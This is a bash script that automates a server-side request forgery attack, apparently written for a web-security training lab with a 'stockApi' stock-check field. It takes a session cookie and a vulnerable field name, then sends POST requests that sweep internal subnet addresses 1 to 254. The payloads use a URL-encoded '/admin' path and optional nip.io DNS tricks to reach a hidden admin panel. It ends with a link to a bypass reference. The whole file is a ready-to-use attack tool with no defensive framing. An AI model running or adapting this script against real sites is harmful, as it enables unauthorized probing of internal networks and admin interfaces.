#!/bin/bash
set -euo pipefail;

read -rp "SITE DOMAIN       (EXAMPLE: google.com): " DOMAIN;
read -rp "POST REQUEST TITLE(EXAMPLE: https://0a650094...t/product/stock): " POST_URL;
read -rp "Session cookie    (EXAMPLE: Jk5…CZi): " COOKIE;
read -rp "URI POST-endpoint (EXAMPLE: /product/stock?productId=1): " URI;
read -rp "Field name SSRF   (EXAMPLE: stockApi): " FIELD;
read -rp "Payload-port      (80, 8080 OR 443): " PPORT;
read -rp "User-Agent        : " USER_AGENT;
read -rp "Expected string   : " EXPECT;
read -rp "URI admin panel   (ADMIN DEFAULT, WRITE ONLY prefix IF IT EXIST): " PREFIX;
read -rp "Is using DNS SPOOF?? (ONLY 'y' or 'n') :" DNS_SPOOFER; 
echo "What kind of net do use?? (ONLY: '1' or '2' or '3')"; 
echo "                          1: 192.168.0.x";
echo "                          2: 127.0.0.x";
read SUBNET;

if [[ "$PPORT" -eq 443 ]]; then
  PSCH="https";
else
  PSCH="http";
fi

if [[ ${DNS_SPOOFER,,} == "y" ]]; then
  NIP=".nip.io";
elif [[ $DNS_SPOOFER == "n" ]]; then
  NIP="";
else
  echo "Unexpected value DNS SPOOF";
  exit 1;
fi

case "$SUBNET" in
  "1")
    SUBNET="192.168.0.";;
  "2")
    SUBNET="127.0.0.";;
  *)
    echo "Unexpected value into subnet";
    exit 1;;
esac


echo "→ POST $POST_URL";
echo "→ PAYLOAD: ${FIELD}=${PSCH}://${SUBNET}x${NIP}:${PPORT}%2f%61%64%6d%69%6e${PREFIX}";

for i in {1..254}; do
  HOST="${SUBNET}${i}";
  PAYLOAD="${PSCH}://${HOST}${NIP}:${PPORT}%2f%61%64%6d%69%6e${PREFIX}";

  ANSWER=$(curl -sS -k --compressed -X POST "$POST_URL" \
    -H "User-Agent: $USER_AGENT" \
    -H "Accept: */*" \
    -H "Accept-Encoding: gzip, deflate, br" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Referer:  https://${DOMAIN}${URI}" \
    -H "Origin:   https://${DOMAIN}" \
    -H "Cookie: session=${COOKIE}" \
    --data-urlencode "${FIELD}=${PAYLOAD}"
  )

  if [[ "${ANSWER,,}" == *"${EXPECT,,}"* ]]; then
    echo "IP FOUND: $HOST Response Length: ${#ANSWER} CODE: HTTP 1.1 200";
    exit 0;
  else
    echo "IP $HOST DOESN'T HAVE $EXPECT RESPONSE..."
    echo "Response Length: ${#ANSWER} CODE: HTTP 1.1 500";
    echo
    echo
    echo
  fi
done

echo >&2 "DIDN'T FIND ANY HOST WITH VALUE: «$EXPECT».";
exit 1;


# https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass.html
# Resource for SSRF ASCII BYPASS